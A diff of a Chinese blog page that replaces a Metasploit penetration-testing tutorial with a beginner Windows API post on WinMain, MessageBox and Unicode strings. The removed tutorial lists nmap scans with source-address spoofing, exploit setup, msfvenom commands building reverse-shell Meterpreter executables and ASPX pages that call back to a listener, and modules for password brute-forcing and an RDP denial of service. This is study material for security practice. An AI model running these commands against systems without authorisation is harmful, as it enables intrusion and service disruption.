@@ -103,20 +103,20 @@
 
 
 
-<meta name="description" content="Metasploit目前最流行、最强大，最具扩展性的渗透测试平台软件，基于Metasploit进行渗透测试 和漏洞分析的流程和方法">
+<meta name="description" content="Windows Api是了解windows程序必不可少的一部分">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Metasploit">
-<meta property="og:url" content="http://yoursite.com/2017/05/21/linux2_msf_1/index.html">
+<meta property="og:title" content="Windows Api第一篇">
+<meta property="og:url" content="http://yoursite.com/2018/05/24/re_20_win_api1/index.html">
 <meta property="og:site_name" content="ESE&#39;s Note">
-<meta property="og:description" content="Metasploit目前最流行、最强大，最具扩展性的渗透测试平台软件，基于Metasploit进行渗透测试 和漏洞分析的流程和方法">
+<meta property="og:description" content="Windows Api是了解windows程序必不可少的一部分">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://i.imgur.com/mP5je67.png">
-<meta property="og:image" content="https://i.imgur.com/ZgFeN9C.png">
-<meta property="og:updated_time" content="2018-05-23T15:16:16.983Z">
+<meta property="og:image" content="https://i.imgur.com/tTYvI3S.png">
+<meta property="og:image" content="https://i.imgur.com/xMr6b6u.png">
+<meta property="og:updated_time" content="2018-05-24T13:35:02.393Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Metasploit">
-<meta name="twitter:description" content="Metasploit目前最流行、最强大，最具扩展性的渗透测试平台软件，基于Metasploit进行渗透测试 和漏洞分析的流程和方法">
-<meta name="twitter:image" content="https://i.imgur.com/mP5je67.png">
+<meta name="twitter:title" content="Windows Api第一篇">
+<meta name="twitter:description" content="Windows Api是了解windows程序必不可少的一部分">
+<meta name="twitter:image" content="https://i.imgur.com/tTYvI3S.png">
 
 
 
@@ -146,12 +146,12 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2017/05/21/linux2_msf_1/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/05/24/re_20_win_api1/"/>
 
 
 
 
-  <title>Metasploit | ESE's Note</title>
+  <title>Windows Api第一篇 | ESE's Note</title>
   
 
 
@@ -302,7 +302,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/05/21/linux2_msf_1/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/24/re_20_win_api1/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="">
@@ -319,7 +319,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Metasploit</h1>
+          <h1 class="post-title" itemprop="name headline">Windows Api第一篇</h1>
         
 
         <div class="post-meta">
@@ -331,8 +331,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-21T08:49:18+08:00">
-                2017-05-21
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-24T20:49:18+08:00">
+                2018-05-24
               </time>
             
 
@@ -354,8 +354,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/linux/" itemprop="url" rel="index">
-                    <span itemprop="name">linux</span>
+                  <a href="/categories/re/" itemprop="url" rel="index">
+                    <span itemprop="name">re</span>
                   </a>
                 </span>
 
@@ -372,8 +372,8 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/05/21/linux2_msf_1/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count valine-comment-count" data-xid="/2017/05/21/linux2_msf_1/" itemprop="commentCount"></span>
+                <a href="/2018/05/24/re_20_win_api1/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count valine-comment-count" data-xid="/2018/05/24/re_20_win_api1/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -405,34 +405,26 @@
       
 
       
-        <p>Metasploit目前最流行、最强大，最具扩展性的渗透测试平台软件，基于Metasploit进行渗透测试 和漏洞分析的流程和方法<br><a id="more"></a></p>
-<h1 id="Metasploit简介"><a href="#Metasploit简介" class="headerlink" title="Metasploit简介"></a>Metasploit简介</h1><p>2003年由HD More发布第一版，2007年用ruby语言重写<br>–框架聚成了渗透测试标准(PETS)思想<br>–一定程度上统一渗透测试和漏洞研究的工作环境<br>–新的攻击代码可以比较容易的加入框架<br>2014年没有出过关于Metasploit的教材，最近的一本——《Metasploit渗透测试指南》<br>四个版本<br><img src="https://i.imgur.com/mP5je67.png" alt=""><br>模块<br><img src="https://i.imgur.com/ZgFeN9C.png" alt=""></p>
-<h1 id="MSF架构"><a href="#MSF架构" class="headerlink" title="MSF架构"></a>MSF架构</h1><h2 id="Rex"><a href="#Rex" class="headerlink" title="Rex"></a>Rex</h2><p>——基础功能库，用于完成日常基本任务，无需人工动手编码实现<br>——处理sokcet连接访问，协议应答(http/SSL/SMB等)<br>——编码转换(xor,base64等)</p>
-<h2 id="Core"><a href="#Core" class="headerlink" title="Core"></a>Core</h2><p>——提供Msf的核心基本API，是框架的核心能力实现库</p>
-<h2 id="Base"><a href="#Base" class="headerlink" title="Base"></a>Base</h2><p>——提供友好的API接口，便于模块调用的库</p>
-<h2 id="Plugin"><a href="#Plugin" class="headerlink" title="Plugin"></a>Plugin</h2><p>——连接和调用外部扩展功能和系统</p>
-<p>启动Metasploit<br><code>`
-查看Metasploit数据库db的状态(初始化数据库，删除数据库)</code>msf db<code>主目录</code>cd /usr/share/metasploit-framework/<code>模块</code>cd modules`</p>
-<h2 id="Exploits"><a href="#Exploits" class="headerlink" title="Exploits"></a>Exploits</h2><p>——Exploits:利用系统漏洞进行攻击的动作，此模块对应每一个具体漏洞的攻击方法(主动，被动)。</p>
-<p>——Payload:成功exploit之后，真正在目标系统执行的代码或指令<br>1、Shellcode或者系统命令<br>2、三种Payload：/usr/share/metasploit-framework/modules/payloads/<br>3、Single:all-in-one<br>4、Stager:目标计算机内存有限时，先传输一个较小的payload用于建立连接</p>
-<h2 id="Auxiliary"><a href="#Auxiliary" class="headerlink" title="Auxiliary"></a>Auxiliary</h2><p>——Auxiliary:执行信息收集，枚举，指纹探测、扫描等功能的辅助模块。<br>——Encoders:对payload进行加密，躲避AV检查的模块<br>——Nops:提高payload稳定性及维持大小</p>
-<h1 id="渗透测试步骤"><a href="#渗透测试步骤" class="headerlink" title="渗透测试步骤"></a>渗透测试步骤</h1><p>1、nmap主机发现扫描<br>2、service postgresql start<br>3、msfconsole -q启动<br>4、search 相关模块<br>5、use exploit<br>6、set payload<br>7、exploit -j<br>8、meterpreter 使用</p>
-<h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>不加参数==sT<br>某个ip<br>nmap 192.168.1.2<br>某段ip<br>nmap 192.168.1.1-100<br>某个子网<br>nmap 192.168.1.1/24<br>文本中的ip<br>nmap -iL target.txt<br>参数<br>-sn (速度很快)[ping探测扫描主机， 不进行端口扫描]<br>nmap -sn 192.168.1.1/24<br>-sA (发送tcp的ack包进行探测，可以探测主机是否存活)<br>-sS 半开放扫描（非3次握手的tcp扫描）<br>sT：3次握手方式tcp的扫描,慢<br>sU：udp端口的扫描<br>sF：也是tcp的扫描一种，发送一个FIN标志的数据包<br>sV：版本检测(sV)<br>-A参数，综合扫描。比较慢，不推荐<br>-e：指定网络接口,扫描时使用哪个网卡<br>nmap -e eth0 192.168.1.1/24<br>-S：可以伪装源地址进行扫描。这样好处在于不会被对方发现自己的真实IP<br>nmap -e eth0 192.168.1.53 -S 10.0.1.167 -Pn</p>
-<h1 id="msfconsole"><a href="#msfconsole" class="headerlink" title="msfconsole"></a>msfconsole</h1><h2 id="命令"><a href="#命令" class="headerlink" title="命令"></a>命令</h2><p>查看帮助<br><code>msfconsole -h</code><br>启动Metasploit(msfconsole模式下)<br><code>msfconsole -q</code><br>q安静的的启动，不显示banner<br>查看版本<br><code>msfconsole -v</code><br>启动数据库<br><code>service postgresql start</code><br>查看是否连接数据库<br><code>service postgresql status</code><br><code>db_status</code><br>更新metasploit<br><code>msfupdate</code><br>show命令<br>show exploits<br>show encoders<br>search命令<br>search ms17<br>search mysql<br>check(exploit模式)<br>验证是否存在漏洞<br>back<br>回到msf</p>
-<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><h3 id="Active-exploit"><a href="#Active-exploit" class="headerlink" title="Active exploit"></a>Active exploit</h3><p>——use exploit/windows/smb/psexec<br>——set RHOST 192.168.1.100<br>——set Payoad windows/shell/reverse_tcp<br>——set LHOST 192.168.1.10</p>
-<h3 id="Passive-Exploits"><a href="#Passive-Exploits" class="headerlink" title="Passive Exploits"></a>Passive Exploits</h3><p>——use exploit/windows/browser/ani_loadimage_chunksize<br>——set URIPATH/<br>——set Payoad windows/shell/reverse_tcp<br>——set LHOST 192.168.1.10</p>
-<h2 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h2><p>高级、动态、可扩展的payload<br>——基于meterpreter上下文利用更多漏洞发起 攻击<br>——后渗透测试阶段一站式操作界面<br>完全基于内存的DLL注入式payload(不写硬盘)<br>——注入合法系统进程并建立stager（传输器）<br>——基于stager上传和预加载dll进行扩展模块注入（客户端API）<br>——基于stager建立的socket链接建立加密的TLS/1.0通信隧道<br>——利用TLS隧道进一步加载后续扩展模块（避免网络取证）<br>——服务端（攻击者端）使用C语言编写<br>——客户端（受害者端）提供基于ruby的全特性API（支持任何语言，只是其他语言不一定是全功能）</p>
-<h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>生成win下的exe<br>msfvenom -a x86 –platform win -p windows/meterpreter/reverse_tcp LHOST=192.168.1.109 LPORT=5566 -f exe x&gt; /home/niexinming/back.exe<br>生成win下的aspx<br>msfvenom -a x86 –platform win -p windows/meterpreter/reverse_tcp LHOST= 192.168.1.109 LPORT=7788 -f aspx x&gt; /home/niexinming/back.aspx<br>本地监听，反弹后的控制端：<br>use exploit/multi/handler<br>本地监听的确定用哪个payload：<br>set payload windows/meterpreter/reverse_tcp<br>设置本地监听的端口：<br>set lport 7788<br>设置本地的监听的地址：<br>set lhost 0.0.0.0<br>运行：<br>run<br>访问生成的反弹马：<br><a href="http://xxx.xxx.xx.xxx:/back.aspx" target="_blank" rel="external">http://xxx.xxx.xx.xxx:/back.aspx</a></p>
-<h1 id="弱点扫描"><a href="#弱点扫描" class="headerlink" title="弱点扫描"></a>弱点扫描</h1><p>VNC密码破解<br>use auxiliary/scanner/vnc/vnc_login<br>use auxiliary/scanner/vnc/vnc_none_auth</p>
-<p>windows:远程桌面服务<br>use auxiliary/scanner/rdp/ms12_020_check<br>use auxiliary/dos/windows/rdp/ms12_020_maxchannelids (导致拒绝服务)</p>
-<p>设置ssh<br>use auxiliary/scanner/ssh/fortinet_backdoor<br>use auxiliary/scanner/ssh/juniper_backdoor</p>
-<p>VMare EXI密码爆破<br>use auxiliary/scanner/vmware/vmauthd_login<br>use auxiliary/scanner/vmware/vmware_enum_vms</p>
-<p>Web API远程开启虚拟机<br>use auxiliary/admin/vmware/poweron_vm</p>
-<p>查看证书是否过期<br>use auxiliary/scanner/http/cert</p>
-<p>tomcat管理页面<br>use auxiliary/scanner/http/tomcat_mgr_login </p>
-<p>wordpress密码爆破<br>use auxiliary/scanner/http/wordpress_login_enum</p>
-<p>WMAP web扫描器<br>load wmap<br>wmap_sites -h</p>
-<p>openvas<br>load openvas</p>
+        <p>Windows Api是了解windows程序必不可少的一部分<br><a id="more"></a></p>
+<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>以前编写的都是dos程序，Windows程序却更贴近windows.</p>
+<h2 id="Hello-world"><a href="#Hello-world" class="headerlink" title="Hello world"></a>Hello world</h2><p>新建项目-&gt;win32-&gt;windows应用程序(空项目)<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt; </span></span></div><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance,PSTR szCmdLine, <span class="keyword">int</span> iCmdShow)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"Hello, Windows 98!"</span>), TEXT(<span class="string">"HelloMsg"</span>), <span class="number">1</span>);</div><div class="line"></div><div class="line">	<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>参数  </p>
+<h3 id="int-WINAPI-WinMain"><a href="#int-WINAPI-WinMain" class="headerlink" title="int WINAPI WinMain()"></a>int WINAPI WinMain()</h3><p>1、<code>#include &lt;windows.h&gt;</code>每个用C编写Windows程序的开头都应该包含，主要含入档案。<br>2、<code>int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+    PSTR szCmdLine, int iCmdShow)</code><br>程序的入口点，向main一样，只是Windows叫做WinMain。第一个参数代表执行实体代号，函数定义第三参数个是LPSTR(是16位windows下)。</p>
+<h3 id="MessageBox"><a href="#MessageBox" class="headerlink" title="MessageBox()"></a>MessageBox()</h3><p>显示小视窗，实际上是一个对话框。<br>参数1:通常是视窗代号<br>参数2:讯息方块主体中显示的字符串<br>参数3:标题<br>参数4:按钮数量(如下图)<br><img src="https://i.imgur.com/tTYvI3S.png" alt=""></p>
+<h1 id="Unicode"><a href="#Unicode" class="headerlink" title="Unicode"></a>Unicode</h1><h2 id="宽字元"><a href="#宽字元" class="headerlink" title="宽字元"></a>宽字元</h2><p>Win32程序中标准字元定义<br><code>char c = &#39;A&#39;;</code><br>占一个字节，需要一个位的元组存储<br><code>char *p</code><br>这里p占4个字节<br><code>char a[] = &quot;Hello!&quot;</code><br>占七个字节(最后加一个0结束)，需要七个位的元组存储<br>Windwos程序标准元定义<br><code>typedef unsigned short wchar_t;</code><br>这里wchar_t与unsigned short int相同，都是16位元宽，也就是2字节<br><code>wchar_t c = &#39;A&#39;;</code><br>这时候c=0x0041,虽然’A’是一个字节，但是前面是2字节，编译器会自动扩充，就是Unicode字母A，占2个字节，存储顺序0x41,0x00<br><code>wchar_t *p = L&#39;Hello!&#39;;</code><br>这里有个L(代表[long])。字符串需要14个位元(14个字节),指数p需要4个字节<br><code>wchar_t a[] = L&#39;Hello&#39;;</code><br>这里字符串需要14个位元</p>
+<h3 id="宽字元程式"><a href="#宽字元程式" class="headerlink" title="宽字元程式"></a>宽字元程式</h3><p>char <em>pc=”Hello!”;<br>len=strlen(pc);<br>这时len==6<br>wchar_t </em>pw=”Hello!”;<br>len=strlen(pw);<br>这时len==1 ????<br>因为strlen()应该接受char类型的指标，但是却接受unsigned short类型,我们来看看为什么是1<br>0x0048 0x0065 0x006c 0x006c 0x006d 0x0021<br>48 00 64 00 6c 00 6c 00 6f 00 21 00<br>当strlen()遇见0，则表示字符结束。那么怎么办。这时候就出现了wcslen(宽字节长度)。<br>strlen()函数定义<br><code>size_t __cdecl strlen(const char *);</code><br>wcslen()函数定义<br><code>size_t __cdecl wcslen(const wchar_t *);</code><br>如果这时<br><code>len=wcslen(pw)</code><br>这时len==6<br>扩展</p>
+<p>strlen        wcslen<br>printf        wprintf<br>char        TCHAR</p>
+<h3 id="L问题"><a href="#L问题" class="headerlink" title="L问题"></a>L问题</h3><p>如果定义了_UNICODE识别字，那么一个称作_T的巨集就定义如下</p>
+<p>#define __T(x) L##x<br>_TEXT(“Hello!”)==L”Hello!”<br>如果没有定义_UNICODE<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _T(x) __T(x) </span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> _TEXT(x) __T(x)</span></div></pre></td></tr></table></figure></p>
+<p>_TEXT(“Hello!”)==8字节</p>
+<h2 id="Windows函数呼叫"><a href="#Windows函数呼叫" class="headerlink" title="Windows函数呼叫"></a>Windows函数呼叫</h2><p>MessageBox的两个变形<br>MessageBoxA<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function">WINUSERAPI <span class="keyword">int</span> WINAPI <span class="title">MessageBoxA</span><span class="params">(HWND hWnd,LPCSTR lpText,LPCSTR lpCaption,UINT uType)</span></span>;</div></pre></td></tr></table></figure></p>
+<p>MessageBoxW<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="function">WINUSERAPI <span class="keyword">int</span> WINAPI <span class="title">MessageBoxA</span><span class="params">(HWND hWnd,LPWSTR lpText,LPWSTR lpCaption,UINT uType)</span></span>;</div></pre></td></tr></table></figure></p>
+<p>上述而MessageBox也可以<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> UNICODE</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MessageBox MessageBoxW</span></div><div class="line"><span class="meta">#<span class="meta-keyword">else</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MessageBox MessageBoxA</span></div><div class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></div></pre></td></tr></table></figure></p>
+<h2 id="Windows字符串函式"><a href="#Windows字符串函式" class="headerlink" title="Windows字符串函式"></a>Windows字符串函式</h2><p>Windows定义的一组字符串函数式<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">len = lstrlen(pString);</div><div class="line">pString = lstrcpy(pString1,pString2);</div><div class="line">pString = lstrcpyn(pString1,pString2,iCount);</div><div class="line">pString = lstrcat (pString1, pString2) ; </div><div class="line">iComp = lstrcmp (pString1, pString2) ; </div><div class="line">iComp = lstrcmpi (pString1, pString2) ;</div></pre></td></tr></table></figure></p>
+<p>printf<br><code>int printf (const char * szFormat, ...) ;</code><br>sprintf()<br><code>int sprintf (char * szBuffer, const char * szFormat, ...) ;</code><br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">printf</span> (<span class="string">"The sum of %i and %i is %i"</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>+<span class="number">3</span>) ; </div><div class="line">相等于</div><div class="line"><span class="keyword">char</span> szBuffer [<span class="number">100</span>] ; </div><div class="line"><span class="built_in">sprintf</span> (szBuffer, <span class="string">"The sum of %i and %i is %i"</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">5</span>+<span class="number">3</span>) ; </div><div class="line"><span class="built_in">puts</span> (szBuffer) ;</div></pre></td></tr></table></figure></p>
+<h1 id="视窗和讯息"><a href="#视窗和讯息" class="headerlink" title="视窗和讯息"></a>视窗和讯息</h1><p>创建一个自己的视窗<br>呼叫CreateWindow,先要注册一个视窗类别。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">"winmm.lib"</span>) </span></div><div class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND, UINT, WPARAM, LPARAM)</span></span>;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> WINAPI <span class="title">WinMain</span><span class="params">(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR szCmdLine, <span class="keyword">int</span> iCmdShow)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"></div><div class="line">	<span class="keyword">static</span> TCHAR szAppName[] = TEXT(<span class="string">"HelloWin"</span>);</div><div class="line">	HWND hwnd;  MSG msg;</div><div class="line">	WNDCLASS wndclass;</div><div class="line">	wndclass.style = CS_HREDRAW | CS_VREDRAW;</div><div class="line">	wndclass.lpfnWndProc = WndProc;  wndclass.cbClsExtra = <span class="number">0</span>;</div><div class="line">	wndclass.cbWndExtra = <span class="number">0</span>;</div><div class="line">	wndclass.hInstance = hInstance;</div><div class="line">	wndclass.hIcon = LoadIcon(<span class="literal">NULL</span>, IDI_APPLICATION);</div><div class="line">	wndclass.hCursor = LoadCursor(<span class="literal">NULL</span>, IDC_ARROW);</div><div class="line">	wndclass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);</div><div class="line">	wndclass.lpszClassName = szAppName;</div><div class="line">	<span class="keyword">if</span> (!RegisterClass(&amp;wndclass))</div><div class="line">	&#123;</div><div class="line">		MessageBox(<span class="literal">NULL</span>, TEXT(<span class="string">"This program requires Windows NT!"</span>), szAppName, MB_ICONERROR);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	hwnd = CreateWindow(szAppName, <span class="comment">// window class name    </span></div><div class="line">		TEXT(<span class="string">"The Hello Program"</span>), <span class="comment">// window caption    </span></div><div class="line">		WS_OVERLAPPEDWINDOW, <span class="comment">// window style    </span></div><div class="line">		CW_USEDEFAULT, <span class="comment">// initial x position    </span></div><div class="line">		CW_USEDEFAULT, <span class="comment">// initial y position    </span></div><div class="line">		CW_USEDEFAULT, <span class="comment">// initial x size    </span></div><div class="line">		CW_USEDEFAULT, <span class="comment">// initial y size    </span></div><div class="line">		<span class="literal">NULL</span>,   <span class="comment">// parent window handle       </span></div><div class="line">		<span class="literal">NULL</span>,         <span class="comment">// window menu handle       </span></div><div class="line">		hInstance,     <span class="comment">// program instance handle       </span></div><div class="line">		<span class="literal">NULL</span>);      <span class="comment">// creation parameters </span></div><div class="line"></div><div class="line">	ShowWindow(hwnd, iCmdShow);</div><div class="line">	UpdateWindow(hwnd);</div><div class="line">	<span class="keyword">while</span> (GetMessage(&amp;msg, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>))</div><div class="line">	&#123;</div><div class="line">		TranslateMessage(&amp;msg);</div><div class="line">		DispatchMessage(&amp;msg);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> msg.wParam;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function">LRESULT CALLBACK <span class="title">WndProc</span><span class="params">(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)</span></span></div><div class="line"><span class="function"></span>&#123;</div><div class="line">	HDC   hdc;</div><div class="line">	PAINTSTRUCT ps;</div><div class="line">	RECT  rect;</div><div class="line">	<span class="keyword">switch</span> (message)</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">case</span> WM_CREATE:</div><div class="line">		PlaySound(TEXT(<span class="string">"hellowin.wav"</span>), <span class="literal">NULL</span>, SND_FILENAME | SND_ASYNC);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	<span class="keyword">case</span>  WM_PAINT:</div><div class="line">		hdc = BeginPaint(hwnd, &amp;ps);</div><div class="line">		GetClientRect(hwnd, &amp;rect);</div><div class="line">		DrawText(hdc, TEXT(<span class="string">"Hello, Windows 98!"</span>), <span class="number">-1</span>, &amp;rect, DT_SINGLELINE | DT_CENTER | DT_VCENTER);</div><div class="line">		EndPaint(hwnd, &amp;ps);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	<span class="keyword">case</span> WM_DESTROY:</div><div class="line">		PostQuitMessage(<span class="number">0</span>);</div><div class="line">		<span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">return</span> DefWindowProc(hwnd, message, wParam, lParam);</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>上面函数至少呼叫了 18 个 Windows 函式。下面以它们在 HELLOWIN 中出现 的次序列出这些函式以及各自的简明描述：<br><img src="https://i.imgur.com/xMr6b6u.png" alt=""></p>
 
       
     </div>
@@ -492,15 +484,15 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
+              <a href="/2018/05/23/re_19_dll_1/" rel="next" title="dll的编写，调用，分析">
+                <i class="fa fa-chevron-left"></i> dll的编写，调用，分析
+              </a>
+            
           </div>
 
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/01/web_1_bp/" rel="prev" title="搬家啦_BurpSuite从安装到"放弃"">
-                搬家啦_BurpSuite从安装到"放弃" <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -713,7 +705,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Metasploit简介"><span class="nav-number">1.</span> <span class="nav-text">Metasploit简介</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#MSF架构"><span class="nav-number">2.</span> <span class="nav-text">MSF架构</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Rex"><span class="nav-number">2.1.</span> <span class="nav-text">Rex</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Core"><span class="nav-number">2.2.</span> <span class="nav-text">Core</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Base"><span class="nav-number">2.3.</span> <span class="nav-text">Base</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Plugin"><span class="nav-number">2.4.</span> <span class="nav-text">Plugin</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploits"><span class="nav-number">2.5.</span> <span class="nav-text">Exploits</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Auxiliary"><span class="nav-number">2.6.</span> <span class="nav-text">Auxiliary</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#渗透测试步骤"><span class="nav-number">3.</span> <span class="nav-text">渗透测试步骤</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#nmap扫描"><span class="nav-number">4.</span> <span class="nav-text">nmap扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#msfconsole"><span class="nav-number">5.</span> <span class="nav-text">msfconsole</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#命令"><span class="nav-number">5.1.</span> <span class="nav-text">命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">5.2.</span> <span class="nav-text">Exploit</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Active-exploit"><span class="nav-number">5.2.1.</span> <span class="nav-text">Active exploit</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Passive-Exploits"><span class="nav-number">5.2.2.</span> <span class="nav-text">Passive Exploits</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Meterpreter"><span class="nav-number">5.3.</span> <span class="nav-text">Meterpreter</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#反弹shell"><span class="nav-number">6.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#弱点扫描"><span class="nav-number">7.</span> <span class="nav-text">弱点扫描</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Windows"><span class="nav-number">1.</span> <span class="nav-text">Windows</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Hello-world"><span class="nav-number">1.1.</span> <span class="nav-text">Hello world</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#int-WINAPI-WinMain"><span class="nav-number">1.1.1.</span> <span class="nav-text">int WINAPI WinMain()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MessageBox"><span class="nav-number">1.1.2.</span> <span class="nav-text">MessageBox()</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Unicode"><span class="nav-number">2.</span> <span class="nav-text">Unicode</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#宽字元"><span class="nav-number">2.1.</span> <span class="nav-text">宽字元</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" 